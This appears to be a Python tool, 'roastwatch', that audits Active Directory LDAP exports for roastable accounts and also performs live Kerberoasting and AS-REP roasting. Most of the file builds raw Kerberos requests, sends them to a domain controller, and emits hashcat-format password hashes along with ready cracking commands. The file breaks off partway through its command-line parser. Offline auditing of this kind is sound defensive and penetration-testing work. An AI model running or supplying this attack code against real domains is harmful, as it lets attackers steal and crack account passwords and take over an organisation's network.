#!/usr/bin/env python3
"""roastwatch -- Kerberoast / AS-REP roastability enumerator.

Offline mode reads an LDAP export and reports which accounts are
roastable. Live modes speak Kerberos v5 (RFC 4120) directly to a domain
controller on TCP (or UDP) port 88 and emit hashcat-format lines:

  - AS-REP roast (no pre-auth needed, zero credentials): hashcat
    modes 18200 (RC4), 32100 (AES128), 32200 (AES256)
  - Kerberoast (needs one low-privilege account): hashcat modes
    13100 (RC4), 19600 (AES128), 19700 (AES256)

Standard library only. Python 3.8+.
"""

import argparse
import base64
import hmac
import json
import os
import random
import socket
import struct
import sys
import time
from hashlib import md5
VERSION = "0.1.0"

EXIT_OK = 0        # no roastable accounts / no hashes captured
EXIT_FINDINGS = 1  # something roastable found or a hash captured
EXIT_ERROR = 2     # bad arguments, unreachable target, malformed input

# ---- userAccountControl bits we care about ----
UF_ACCOUNTDISABLE = 0x0002
UF_WORKSTATION_TRUST = 0x1000
UF_SERVER_TRUST = 0x2000
UF_SMARTCARD_REQUIRED = 0x40000
UF_USE_DES_KEY_ONLY = 0x200000
UF_DONT_REQUIRE_PREAUTH = 0x400000
TRUST_BITS = UF_WORKSTATION_TRUST | UF_SERVER_TRUST

# ---- msDS-SupportedEncryptionTypes bits ----
ETYPES_AES = 0x8 | 0x10  # AES128 | AES256
ETYPES_DES = 0x1 | 0x2

# ---- Kerberos etype numbers ----
ETYPE_AES128 = 17
ETYPE_AES256 = 18
ETYPE_RC4 = 23

# ---- key usages (RFC 4120 section 7.5.1) ----
KU_PA_ENC_TIMESTAMP = 1   # AS-REQ PA-ENC-TIMESTAMP, client key
KU_AS_REP_ENC_PART = 3    # AS-REP encrypted part, client key
KU_TGS_AUTHENTICATOR = 7  # AP-REQ authenticator inside PA-TGS-REQ
KU_TGS_REP_ENC_PART = 8   # TGS-REP encrypted part, TGS session key

# ---- KDC error codes (RFC 4120 section 7.5.7 table) ----
KDC_ERRORS = {
    6: "client principal unknown",
    7: "server principal unknown",
    14: "encryption type not supported",
    15: "checksum type not supported",
    18: "client account disabled/revoked",
    23: "client key expired (password change required)",
    24: "pre-authentication failed (bad password or hash)",
    25: "pre-authentication required",
    37: "clock skew too great",
}

KDC_OPTIONS_DEFAULT = 0x50800000  # forwardable + proxiable + renewable-ok
SESSION_LIFETIME = 3600


class RoastError(Exception):
    """One-line failure the CLI prints as `error: ...` with exit code 2."""


# ---------------------------------------------------------------------------
# DER (the subset Kerberos messages use)
# ---------------------------------------------------------------------------

class DerError(RoastError):
    pass


def _enc_len(n):
    if n < 0x80:
        return bytes([n])
    out = b""
    while n:
        out = bytes([n & 0xFF]) + out
        n >>= 8
    return bytes([0x80 | len(out)]) + out


def _tlv(tag, content):
    return bytes([tag]) + _enc_len(len(content)) + content


def enc_int(n):
    if n == 0:
        return _tlv(0x02, b"\x00")
    if n < 0:
        raise DerError("negative integers are not used by this tool")
    b = n.to_bytes((n.bit_length() + 8) // 8, "big").lstrip(b"\x00")
    if b[0] & 0x80:
        b = b"\x00" + b
    return _tlv(0x02, b)


def enc_seq(*items):
    return _tlv(0x30, b"".join(items))


def enc_ctx(n, content):
    return _tlv(0xA0 | n, content)


def enc_app(n, content):
    return _tlv(0x60 | n, content)


def enc_octet(b):
    return _tlv(0x04, b)


def enc_gstr(s):
    return _tlv(0x1B, s.encode("utf-8"))


def _read_tlv(buf, off):
    if off >= len(buf):
        raise DerError("truncated TLV (no tag byte)")
    tag = buf[off]
    off += 1
    if tag & 0x1F == 0x1F:
        raise DerError("multi-byte tag numbers are not supported")
    if off >= len(buf):
        raise DerError("truncated TLV (no length byte)")
    first = buf[off]
    off += 1
    if first < 0x80:
        ln = first
    elif first == 0x80:
        raise DerError("indefinite lengths are not supported")
    else:
        k = first & 0x7F
        if off + k > len(buf):
            raise DerError("truncated long-form length")
        ln = int.from_bytes(buf[off:off + k], "big")
        off += k
    if off + ln > len(buf):
        raise DerError("TLV content runs past end of buffer")
    return tag, buf[off:off + ln], off + ln


def der_decode(buf):
    if not isinstance(buf, (bytes, bytearray)):
        raise DerError("expected bytes")
    tag, val, end = _read_tlv(bytes(buf), 0)
    if end != len(buf):
        raise DerError("trailing bytes after DER element")
    return DerNode(tag, val, bytes(buf[:end]))


class DerNode:
    __slots__ = ("tag", "val", "raw", "_kids")

    def __init__(self, tag, val, raw):
        self.tag = tag
        self.val = val
        self.raw = raw
        self._kids = None

    def kids(self):
        if self._kids is None:
            kids = []
            off = 0
            while off < len(self.val):
                t, v, end = _read_tlv(self.val, off)
                kids.append(DerNode(t, v, self.val[off:end]))
                off = end
            self._kids = kids
        return self._kids

    def kid(self, n):
        """First child whose tag number (low 5 bits) is n, else None."""
        for c in self.kids():
            if (c.tag & 0x1F) == n:
                return c
        return None

    def is_app(self, n):
        return (self.tag & 0xE0) == 0x60 and (self.tag & 0x1F) == n

    def payload(self):
        """The field container of an application-tagged message.

        RFC 4120's module uses explicit tags, so [APPLICATION 11] wraps an
        inner SEQUENCE that carries the fields. Odd KDCs that encode
        implicitly get tolerated by falling back to the node itself."""
        kids = self.kids()
        if len(kids) == 1 and kids[0].tag == 0x30:
            return kids[0]
        return self

    def as_int(self):
        if not self.val:
            raise DerError("empty INTEGER")
        return int.from_bytes(self.val, "big", signed=True)

    def as_bytes(self):
        return self.val

    def as_str(self):
        return self.val.decode("utf-8", "replace")


def field(node, n):
    """Context-tagged field n of a structure, one explicit tag stripped.

    RFC 4120's module is EXPLICIT TAGS, so every [n] wraps the value's own
    TLV: [1] INTEGER reads A1 03 02 01 05. kid(n) finds the wrapper, this
    returns the value TLV inside it (or the wrapper itself when it holds
    several children, i.e. SEQUENCE OF payloads)."""
    c = node.kid(n)
    if c is None:
        return None
    if (c.tag & 0xE0) == 0xA0:
        kids = c.kids()
        if len(kids) == 1:
            return kids[0]
    return c


# ---------------------------------------------------------------------------
# Crypto primitives (MD4, RC4, RC4-HMAC). All pure Python so nothing here
# depends on an OpenSSL build with legacy algorithms enabled.
# ---------------------------------------------------------------------------

def md4(data):
    """RFC 1320. Pure Python so no OpenSSL legacy provider is needed."""

    def lrot(x, n):
        return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF

    msg = bytearray(data)
    bitlen = len(data) * 8
    msg.append(0x80)
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += struct.pack("<Q", bitlen)

    r1_s = (3, 7, 11, 19)
    r2_k = (0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15)
    r2_s = (3, 5, 9, 13)
    r3_k = (0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15)
    r3_s = (3, 9, 11, 15)

    a0, b0, c0, d0 = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476
    for off in range(0, len(msg), 64):
        m = struct.unpack("<16I", msg[off:off + 64])
        a, b, c, d = a0, b0, c0, d0
        for i in range(16):
            f = ((b & c) | (~b & d)) + a + m[i]
            a = lrot(f & 0xFFFFFFFF, r1_s[i % 4])
            a, b, c, d = d, a, b, c
        for i in range(16):
            f = ((b & c) | (b & d) | (c & d)) + a + m[r2_k[i]] + 0x5A827999
            a = lrot(f & 0xFFFFFFFF, r2_s[i % 4])
            a, b, c, d = d, a, b, c
        for i in range(16):
            f = (b ^ c ^ d) + a + m[r3_k[i]] + 0x6ED9EBA1
            a = lrot(f & 0xFFFFFFFF, r3_s[i % 4])
            a, b, c, d = d, a, b, c
        a0 = (a0 + a) & 0xFFFFFFFF
        b0 = (b0 + b) & 0xFFFFFFFF
        c0 = (c0 + c) & 0xFFFFFFFF
        d0 = (d0 + d) & 0xFFFFFFFF
    return struct.pack("<4I", a0, b0, c0, d0)


class RC4:
    def __init__(self, key):
        s = list(range(256))
        j = 0
        for i in range(256):
            j = (j + s[i] + key[i % len(key)]) & 0xFF
            s[i], s[j] = s[j], s[i]
        self.s = s
        self.i = 0
        self.j = 0

    def stream(self, n):
        out = bytearray()
        s, i, j = self.s, self.i, self.j
        for _ in range(n):
            i = (i + 1) & 0xFF
            j = (j + s[i]) & 0xFF
            s[i], s[j] = s[j], s[i]
            out.append(s[(s[i] + s[j]) & 0xFF])
        self.i, self.j = i, j
        return bytes(out)


def _xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


def rc4_hmac_encrypt(key, data, usage):
    """RFC 4757 ENCRYPT: returns checksum(16) || RC4(K3, conf || data)."""
    k1 = hmac.new(key, struct.pack("<I", usage), "md5").digest()
    conf = os.urandom(8)
    body = conf + data
    chk = hmac.new(k1, body, "md5").digest()
    k3 = hmac.new(k1, chk, "md5").digest()
    return chk + _xor(RC4(k3).stream(len(body)), body)


def rc4_hmac_decrypt(key, edata, usage):
    """RFC 4757 DECRYPT: verifies the checksum, strips the confounder."""
    if len(edata) < 24:
        raise RoastError("RC4-HMAC ciphertext is too short")
    k1 = hmac.new(key, struct.pack("<I", usage), "md5").digest()
    chk, body = edata[:16], edata[16:]
    k3 = hmac.new(k1, chk, "md5").digest()
    dec = _xor(RC4(k3).stream(len(body)), body)
    if hmac.new(k1, dec, "md5").digest() != chk:
        raise RoastError("RC4-HMAC checksum mismatch (wrong key?)")
    return dec[8:]  # strip the 8-byte confounder


def nt_hash(password):
    return md4(password.encode("utf-16-le"))


def parse_nthash(text):
    t = text.strip().lower()
    if len(t) != 32:
        raise RoastError("--nthash must be 32 hex characters")
    try:
        return bytes.fromhex(t)
    except ValueError:
        raise RoastError("--nthash must be 32 hex characters")


# ---------------------------------------------------------------------------
# Kerberos message builders and parsers (RFC 4120)
# ---------------------------------------------------------------------------

def kerberos_time(when=None):
    return time.strftime("%Y%m%d%H%M%SZ", time.gmtime(when or time.time()))


def enc_princ(ntype, parts):
    return enc_seq(
        enc_ctx(0, enc_int(ntype)),
        enc_ctx(1, enc_seq(*[enc_gstr(p) for p in parts])),
    )


def principal_strings(node):
    """PrincipalName body node -> list of name components."""
    strings = field(node, 1)
    if strings is None:
        raise DerError("PrincipalName without name-string")
    return [c.as_str() for c in strings.kids()]


def build_pa_enc_timestamp(key):
    ts = enc_seq(enc_ctx(0, enc_gstr(kerberos_time())))
    enc = rc4_hmac_encrypt(key, ts, KU_PA_ENC_TIMESTAMP)
    return enc_seq(enc_ctx(1, enc_int(2)), enc_ctx(2, enc_octet(enc)))


def build_as_req(cname, realm, etypes, preauth=None, till=None, nonce=None):
    """AS-REQ. preauth=None asks without pre-authentication (AS-REP roast)."""
    if nonce is None:
        nonce = random.getrandbits(31)
    body = enc_ctx(0, enc_int(KDC_OPTIONS_DEFAULT))
    if cname is not None:
        body += enc_ctx(1, enc_princ(1, [cname]))
    body += enc_ctx(2, enc_gstr(realm))
    body += enc_ctx(3, enc_princ(2, ["krbtgt", realm]))
    body += enc_ctx(5, enc_gstr(till or kerberos_time(time.time() + SESSION_LIFETIME)))
    body += enc_ctx(7, enc_int(nonce))
    body += enc_ctx(8, enc_seq(*[enc_int(e) for e in etypes]))
    parts = [enc_ctx(1, enc_int(5)), enc_ctx(2, enc_int(10))]
    if preauth is not None:
        parts.append(enc_ctx(3, enc_seq(preauth)))
    parts.append(enc_ctx(4, body))
    return enc_app(10, enc_seq(*parts))


def build_tgs_req(session_key, session_etype, ticket_raw, cname, realm, spn,
                  etypes, till=None, nonce=None):
    """TGS-REQ for one SPN, using the TGT we just obtained."""
    if nonce is None:
        nonce = random.getrandbits(31)
    auth = enc_app(2, enc_seq(
        enc_ctx(0, enc_int(5)),                # authenticator-vno
        enc_ctx(1, enc_gstr(realm)),           # crealm
        enc_ctx(2, enc_princ(1, [cname])),     # cname
    ))
    enc_auth = rc4_hmac_encrypt(session_key, auth, KU_TGS_AUTHENTICATOR)
    apreq = enc_app(14, enc_seq(
        enc_ctx(0, enc_int(5)),
        enc_ctx(1, enc_int(14)),
        enc_ctx(2, enc_int(0)),                # ap-options
        ticket_raw,                            # TGT, passed through verbatim
        enc_ctx(4, enc_seq(enc_ctx(0, enc_int(session_etype)),
                           enc_ctx(2, enc_octet(enc_auth)))),
    ))
    pa = enc_seq(enc_ctx(1, enc_int(1)), enc_ctx(2, enc_octet(apreq)))
    body = enc_ctx(0, enc_int(KDC_OPTIONS_DEFAULT))
    body += enc_ctx(2, enc_gstr(realm))
    body += enc_ctx(3, enc_princ(2, spn.split("/")))
    body += enc_ctx(5, enc_gstr(till or kerberos_time(time.time() + SESSION_LIFETIME)))
    body += enc_ctx(7, enc_int(nonce))
    body += enc_ctx(8, enc_seq(*[enc_int(e) for e in etypes]))
    return enc_app(12, enc_seq(
        enc_ctx(1, enc_int(5)),
        enc_ctx(2, enc_int(12)),
        enc_ctx(3, enc_seq(pa)),
        enc_ctx(4, body),
    ))


def parse_error(node):
    body = node.payload()
    code = field(body, 6).as_int()
    etext = None
    e = field(body, 11)
    if e is not None:
        etext = e.as_str()
    return {"kind": "error", "code": code, "etext": etext}


def parse_kdcrep(node, kind):
    body = node.payload()
    crealm = field(body, 3)
    cname = field(body, 4)
    ticket = field(body, 5)
    enc = field(body, 6)
    if enc is None:
        raise DerError("KDC-REP without an enc-part")
    etype = field(enc, 0)
    cipher = field(enc, 2)
    if etype is None or cipher is None:
        raise DerError("KDC-REP enc-part without etype/cipher")
    kvno = field(enc, 1)
    return {
        "kind": kind,
        "crealm": crealm.as_str() if crealm is not None else "",
        "cname": principal_strings(cname)[0] if cname is not None else "",
        "ticket": ticket.raw if ticket is not None else b"",
        "etype": etype.as_int(),
        "kvno": kvno.as_int() if kvno is not None else None,
        "cipher": cipher.as_bytes(),
    }


def parse_reply(data):
    node = der_decode(data)
    if node.is_app(11):
        return parse_kdcrep(node, "asrep")
    if node.is_app(13):
        return parse_kdcrep(node, "tgsrep")
    if node.is_app(30):
        return parse_error(node)
    raise RoastError("unexpected KDC reply (application tag 0x%02x)" % node.tag)


def decrypt_as_rep_part(rep, key):
    """Decrypt the AS-REP enc-part (client key, usage 3) -> (etype, session key)."""
    etype = rep["etype"]
    if etype != ETYPE_RC4:
        raise RoastError(
            "AS-REP enc-part uses etype %d; this build decrypts RC4 (23) only. "
            "Rerun with --etypes 23 so the KDC picks RC4." % etype)
    plain = rc4_hmac_decrypt(key, rep["cipher"], KU_AS_REP_ENC_PART)
    root = der_decode(plain)
    if not root.is_app(25):
        raise DerError("decrypted AS-REP part is not EncASRepPart")
    root = root.payload()
    keynode = field(root, 0)
    if keynode is None:
        raise DerError("EncASRepPart without a key field")
    return field(keynode, 0).as_int(), field(keynode, 1).as_bytes()


# ---------------------------------------------------------------------------
# KDC transport (RFC 4120 section 7.2)
# ---------------------------------------------------------------------------

def _recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise RoastError("KDC closed the connection early")
        buf += chunk
    return buf


def kdc_exchange(host, port, payload, use_udp=False, timeout=3.0):
    """Send one request, return the raw reply. Raises RoastError on
    unreachable DCs so callers fail fast instead of looping against nothing."""
    err = None
    try:
        if use_udp:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            s.sendto(payload, (host, port))
            try:
                data, _ = s.recvfrom(65535)
            finally:
                s.close()
            return data
        s = socket.create_connection((host, port), timeout=timeout)
        try:
            s.sendall(struct.pack(">I", len(payload)) + payload)
            head = _recv_exact(s, 4)
            ln = struct.unpack(">I", head)[0]
            if ln == 0 or ln > 4 * 1024 * 1024:
                raise RoastError("KDC sent an invalid TCP message length")
            return _recv_exact(s, ln)
        finally:
            s.close()
    except RoastError:
        raise
    except Exception as e:  # socket errors, DNS failures, timeouts
        err = e
    raise RoastError("cannot reach %s:%d (%s)" % (host, port, err))


# ---------------------------------------------------------------------------
# LDAP export parsing (LDIF + the JSON shape adcs-audit uses)
# ---------------------------------------------------------------------------

def parse_ldif(text):
    entries = []
    cur = None
    unfolded = []
    for raw in text.splitlines():
        if raw.startswith("#"):
            continue
        if raw.startswith(" ") and unfolded:
            unfolded[-1] += raw[1:]
        else:
            unfolded.append(raw)
    for line in unfolded:
        stripped = line.strip()
        if not stripped:
            if cur:
                entries.append(cur)
                cur = None
            continue
        if stripped.lower().startswith("version:"):
            continue
        if ":" not in line:
            raise DerError("bad LDIF line (no colon): %r" % line[:60])
        attr, _, rest = line.partition(":")
        attr = attr.strip()
        if rest.startswith(":"):
            try:
                val = base64.b64decode(rest[1:].strip())
            except Exception:
                raise DerError("bad base64 value for attribute %r" % attr)
            val = val.decode("utf-8", "replace")
        else:
            val = rest.strip()
        if cur is None:
            cur = {}
        cur.setdefault(attr, []).append(val)
    if cur:
        entries.append(cur)
    return entries


def _norm_attrs(attrs):
    """attrs values -> list of str (accepts scalars or lists)."""
    out = {}
    for k, v in attrs.items():
        if isinstance(v, (list, tuple)):
            out[k] = [str(x) for x in v]
        else:
            out[k] = [str(v)]
    return out


def load_export(path, fmt=None):
    if fmt is None:
        ext = os.path.splitext(path)[1].lower()
        fmt = "json" if ext == ".json" else "ldif"
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            text = fh.read()
    except OSError as e:
        raise RoastError("cannot read export %s (%s)" % (path, e))
    if fmt == "json":
        try:
            data = json.loads(text)
        except json.JSONDecodeError as e:
            raise RoastError("bad JSON export (%s)" % e)
        if isinstance(data, dict):
            data = data.get("users") or data.get("entries") or []
        if not isinstance(data, list):
            raise RoastError("JSON export must be a list of entries")
        entries = []
        for item in data:
            if isinstance(item, dict):
                entries.append(_norm_attrs(item.get("attrs", item)))
        return entries
    try:
        return parse_ldif(text)
    except DerError as e:
        raise RoastError("bad LDIF export (%s)" % e)


def attr_values(entry, name):
    for k, v in entry.items():
        if k.lower() == name.lower():
            return v
    return []


def first_attr(entry, name):
    vs = attr_values(entry, name)
    return vs[0] if vs else None


def parse_uac(v):
    if v is None:
        return None
    try:
        return int(str(v).strip())
    except ValueError:
        return None


def filetime_to_age_days(v):
    """Windows FILETIME (100ns since 1601) -> account password age in days."""
    n = parse_uac(v)
    if n is None or n <= 0 or n >= 9223372036854775807:
        return None
    unix = n / 10_000_000 - 11644473600
    if unix <= 0:
        return None
    return int((time.time() - unix) // 86400)


def analyze_entries(entries):
    accounts = []
    skipped_disabled = 0
    skipped_trust = 0
    skipped_krbtgt = 0
    for e in entries:
        name = first_attr(e, "sAMAccountName")
        if name is None:
            continue
        if name.lower() == "krbtgt":
            skipped_krbtgt += 1
            continue
        uac = parse_uac(first_attr(e, "userAccountControl")) or 0
        if uac & TRUST_BITS:
            skipped_trust += 1
            continue
        if uac & UF_ACCOUNTDISABLE:
            skipped_disabled += 1
            continue
        spns = [s for s in attr_values(e, "servicePrincipalName") if s.strip()]
        etypes = parse_uac(first_attr(e, "msDS-SupportedEncryptionTypes"))
        admin = parse_uac(first_attr(e, "adminCount"))
        pwd_age = filetime_to_age_days(first_attr(e, "pwdLastSet"))
        asrep = bool(uac & UF_DONT_REQUIRE_PREAUTH)
        kerb = bool(spns)
        notes = []
        if admin == 1:
            notes.append("admin")
        if uac & UF_USE_DES_KEY_ONLY:
            notes.append("DES-only enctype")
        if etypes is None or not (etypes & ETYPES_AES):
            notes.append("RC4-era keys (no AES advertised)")
        else:
            notes.append("AES keys advertised")
        if uac & UF_SMARTCARD_REQUIRED:
            notes.append("smartcard required (password likely random)")
        if uac & 0x10000:  # UF_PASSWD_NEVER_EXPIRES
            notes.append("pwd never expires")
        if pwd_age is None:
            notes.append("pwd age unknown")
        else:
            notes.append("pwd age %dd" % pwd_age)
        accounts.append({
            "name": name,
            "spns": spns,
            "enctypes": etypes,
            "admin": admin,
            "pwd_age_days": pwd_age,
            "asrep_roastable": asrep,
            "kerberoastable": kerb,
            "notes": notes,
        })
    return accounts, skipped_disabled, skipped_trust, skipped_krbtgt


def fmt_enum_report(accounts, skipped_disabled, skipped_trust, skipped_krbtgt,
                    show_all=False):
    asrep = [a for a in accounts if a["asrep_roastable"]]
    kerb = [a for a in accounts if a["kerberoastable"] and not a["asrep_roastable"]]
    lines = []
    lines.append("roastwatch %s -- enum report" % VERSION)
    skip = []
    if skipped_disabled:
        skip.append("%d disabled skipped" % skipped_disabled)
    if skipped_trust:
        skip.append("%d trust/computer skipped" % skipped_trust)
    if skipped_krbtgt:
        skip.append("krbtgt skipped")
    lines.append("%d user accounts parsed%s" % (
        len(accounts), (" (%s)" % ", ".join(skip)) if skip else ""))
    lines.append("")
    if asrep:
        lines.append("AS-REP roastable (pre-auth not required) -- %d:" % len(asrep))
        for a in asrep:
            lines.append("  %s" % a["name"])
            lines.append("      %s" % "  |  ".join(a["notes"]))
            if a["spns"]:
                lines.append("      spn: %s" % ", ".join(a["spns"]))
        lines.append("")
    if kerb:
        lines.append("Kerberoastable (has SPNs) -- %d:" % len(kerb))
        for a in kerb:
            lines.append("  %s" % a["name"])
            lines.append("      %s" % "  |  ".join(a["notes"]))
            for spn in a["spns"]:
                lines.append("      spn: %s" % spn)
        lines.append("")
    if not asrep and not kerb:
        lines.append("no roastable accounts found.")
    if show_all:
        rest = [a for a in accounts if a not in asrep and a not in kerb]
        if rest:
            lines.append("not roastable -- %d:" % len(rest))
            for a in rest:
                lines.append("  %s" % a["name"])
            lines.append("")
    if asrep or kerb:
        lines.append("get crackable hashes from a DC you are allowed to test:")
        lines.append("  ./roastwatch.py asrep --dc <dc> --user <name>")
        lines.append("  ./roastwatch.py roast --dc <dc> --user <you> --nthash <hex> --spn <spn>")
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Hashcat line emitters (formats match the example hashes on
# hashcat.net/wiki/doku.php?id=example_hashes: hex, first 16 bytes split
# off for RC4 modes, trailing 12-byte HMAC moved to the front for AES)
# ---------------------------------------------------------------------------

def _hex(b):
    return b.hex()


def emit_asrep_hash(etype, user, realm, cipher):
    if etype == ETYPE_RC4:
        return "$krb5asrep$23$%s@%s:%s$%s" % (
            user, realm, _hex(cipher[:16]), _hex(cipher[16:]))
    if etype in (ETYPE_AES128, ETYPE_AES256):
        return "$krb5asrep$%d$%s$%s$%s$%s" % (
            etype, user, realm, _hex(cipher[-12:]), _hex(cipher[:-12]))
    raise RoastError("no hashcat format for AS-REP etype %d" % etype)


def emit_tgs_hash(etype, user, realm, spn, cipher):
    if etype == ETYPE_RC4:
        return "$krb5tgs$23$*%s$%s$%s*$%s$%s" % (
            user, realm, spn, _hex(cipher[:16]), _hex(cipher[16:]))
    if etype in (ETYPE_AES128, ETYPE_AES256):
        # hashcat's AES formats (19600/19700) carry user and realm but no SPN
        return "$krb5tgs$%d$%s$%s$%s$%s" % (
            etype, user, realm, _hex(cipher[-12:]), _hex(cipher[:-12]))
    raise RoastError("no hashcat format for TGS-REP etype %d" % etype)


HASHCAT_MODES = {
    (3, 23): 18200, (3, 17): 32100, (3, 18): 32200,
    (13, 23): 13100, (13, 17): 19600, (13, 18): 19700,
}


# ---------------------------------------------------------------------------
# Live modes
# ---------------------------------------------------------------------------

def resolve_realm(dc, realm):
    if realm:
        return realm.upper()
    try:
        socket.inet_aton(dc)
        ip = True
    except OSError:
        ip = False
    if ip or "." not in dc:
        raise RoastError("cannot derive a realm from '%s'; pass --realm" % dc)
    return dc.split(".", 1)[1].upper()


def load_users(opts):
    users = list(opts.user or [])
    if opts.users:
        try:
            with open(opts.users, "r", encoding="utf-8", errors="replace") as fh:
                for line in fh:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        users.append(line)
        except OSError as e:
            raise RoastError("cannot read user list %s (%s)" % (opts.users, e))
    if not users:
        raise RoastError("no users given; pass --user or --users")
    return users


def parse_etypes(text):
    out = []
    for part in text.split(","):
        part = part.strip()
        if not part:
            continue
        try:
            n = int(part)
        except ValueError:
            raise RoastError("bad etype %r (use numbers like 23,17,18)" % part)
        if n not in (17, 18, 23):
            raise RoastError("unsupported etype %d (use 23, 17 or 18)" % n)
        out.append(n)
    if not out:
        raise RoastError("empty etype list")
    return out


def run_enum(opts):
    entries = load_export(opts.offline, opts.format)
    accounts, nd, nt, nk = analyze_entries(entries)
    if opts.json:
        print(json.dumps({
            "tool": "roastwatch", "version": VERSION, "mode": "enum",
            "parsed": len(accounts),
            "skipped_disabled": nd, "skipped_trust": nt, "skipped_krbtgt": nk,
            "asrep_roastable": [a["name"] for a in accounts if a["asrep_roastable"]],
            "kerberoastable": [a["name"] for a in accounts
                               if a["kerberoastable"] and not a["asrep_roastable"]],
            "accounts": accounts,
        }, indent=2))
    else:
        print(fmt_enum_report(accounts, nd, nt, nk, opts.all))
    found = any(a["asrep_roastable"] or a["kerberoastable"] for a in accounts)
    return EXIT_FINDINGS if found else EXIT_OK


def status_line(label, status, code=None, etext=None):
    if code is not None:
        msg = KDC_ERRORS.get(code, "KDC error %d" % code)
        if etext:
            msg += " (%s)" % etext
        return "%s: %s" % (label, msg)
    return "%s: %s" % (label, status)


def run_asrep(opts):
    dc, port = opts.dc, opts.port
    realm = resolve_realm(dc, opts.realm)
    users = load_users(opts)
    etypes = parse_etypes(opts.etypes)
    results = []
    got_hash = False
    last_etype = None
    for user in users:
        req = build_as_req(user, realm, etypes)
        data = kdc_exchange(dc, port, req, opts.udp, opts.timeout)
        rep = parse_reply(data)
        if rep["kind"] == "error":
            results.append({"user": user, "status": "error",
                            "error_code": rep["code"], "etext": rep["etext"]})
            if not opts.json:
                sys.stderr.write(status_line(user, "error", rep["code"],
                                             rep["etext"]) + "\n")
            continue
        if rep["kind"] != "asrep":
            raise RoastError("expected an AS-REP or KRB-ERROR, got %s" % rep["kind"])
        h = emit_asrep_hash(rep["etype"], rep["cname"] or user,
                            rep["crealm"] or realm, rep["cipher"])
        got_hash = True
        last_etype = rep["etype"]
        results.append({"user": user, "status": "hash", "hash": h})
        if opts.json:
            pass
        else:
            sys.stdout.write(h + "\n")
    if opts.json:
        print(json.dumps({"tool": "roastwatch", "version": VERSION,
                          "mode": "asrep", "dc": dc, "results": results},
                         indent=2))
    elif last_etype is not None:
        sys.stderr.write("hashcat -m %d hashes.txt wordlist.txt\n"
                         % HASHCAT_MODES[(3, last_etype)])
    return EXIT_FINDINGS if got_hash else EXIT_OK


def roast_credentials(opts):
    if opts.nthash:
        return parse_nthash(opts.nthash)
    if opts.password is not None:
        return nt_hash(opts.password)
    raise RoastError("no credential given; pass --nthash or --password")


def load_spns(opts):
    spns = list(opts.spn or [])
    if opts.spns:
        try:
            with open(opts.spns, "r", encoding="utf-8", errors="replace") as fh:
                for line in fh:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        spns.append(line)
        except OSError as e:
            raise RoastError("cannot read SPN list %s (%s)" % (opts.spns, e))
    if not spns:
        raise RoastError("no SPNs given; pass --spn or --spns")
    return spns


def run_roast(opts):
    dc, port = opts.dc, opts.port
    realm = resolve_realm(dc, opts.realm)
    key = roast_credentials(opts)
    spns = load_spns(opts)

    # Step 1: get a TGT with RC4 pre-authentication.
    preauth = build_pa_enc_timestamp(key)
    req = build_as_req(opts.user, realm, [ETYPE_RC4], preauth=preauth)
    data = kdc_exchange(dc, port, req, opts.udp, opts.timeout)
    rep = parse_reply(data)
    if rep["kind"] == "error":
        code = rep["code"]
        if code == 14:
            raise RoastError("the KDC refused RC4 (etype 23) pre-auth; "
                             "this build needs RC4 enabled for the roast path")
        raise RoastError(status_line(opts.user, "error", code, rep["etext"]))
    session_etype, session_key = decrypt_as_rep_part(rep, key)
    if session_etype != ETYPE_RC4:
        raise RoastError("the KDC issued a session key of etype %d; this build "
                         "can only build authenticators with RC4 (23)"
                         % session_etype)

    # Step 2: one TGS-REQ per SPN. The enc-part ciphertext is the hash.
    results = []
    got_hash = False
    last_etype = ETYPE_RC4
    for spn in spns:
        req = build_tgs_req(session_key, session_etype, rep["ticket"],
                            rep["cname"] or opts.user, realm, spn,
                            [ETYPE_RC4])
        data = kdc_exchange(dc, port, req, opts.udp, opts.timeout)
        tgs = parse_reply(data)
        if tgs["kind"] == "error" and tgs["code"] == 14:
            # RC4 refused for this SPN; ask for AES instead.
            req = build_tgs_req(session_key, session_etype, rep["ticket"],
                                rep["cname"] or opts.user, realm, spn,
                                [ETYPE_AES128, ETYPE_AES256])
            data = kdc_exchange(dc, port, req, opts.udp, opts.timeout)
            tgs = parse_reply(data)
        if tgs["kind"] == "error":
            results.append({"spn": spn, "status": "error",
                            "error_code": tgs["code"], "etext": tgs["etext"]})
            if not opts.json:
                sys.stderr.write(status_line(spn, "error", tgs["code"],
                                             tgs["etext"]) + "\n")
            continue
        last_etype = tgs["etype"]
        h = emit_tgs_hash(tgs["etype"], tgs["cname"] or opts.user,
                          tgs["crealm"] or realm, spn, tgs["cipher"])
        got_hash = True
        results.append({"spn": spn, "status": "hash", "hash": h})
        if not opts.json:
            sys.stdout.write(h + "\n")
    if opts.json:
        print(json.dumps({"tool": "roastwatch", "version": VERSION,
                          "mode": "roast", "dc": dc, "results": results},
                         indent=2))
    else:
        sys.stderr.write("hashcat -m %d hashes.txt wordlist.txt\n"
                         % HASHCAT_MODES[(13, last_etype)])
    return EXIT_FINDINGS if got_hash else EXIT_OK


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_parser():
    p = argparse.ArgumentParser(
        prog="roastwatch",
        description="Kerberoast / AS-REP roastability enumerator with "
                    "hashcat-compatible output.")
    p.add_argument("--version", action="version",
                   version="roastwatch %s" % VERSION)
    sub = p.add_subparsers(dest="mode", required=True)

    pe = sub.add_parser("enum", help="audit an LDAP export (offline, no traffic)")
    pe.add_argument("--offline", required=True, metavar="FILE",
                    help="LDIF (ldapsearch) or JSON export of user objects")
    pe.add_argument("--format", choices=["ldif", "json"], default=None,
                    help="force the export format (default: by file extension)")
    pe.add_argument("--all", action="store_true",
                    help="also list accounts that are not roastable")
    pe.add_argument("--json", action="store_true", help="machine-readable output")
    pe.set_defaults(func=run_enum)

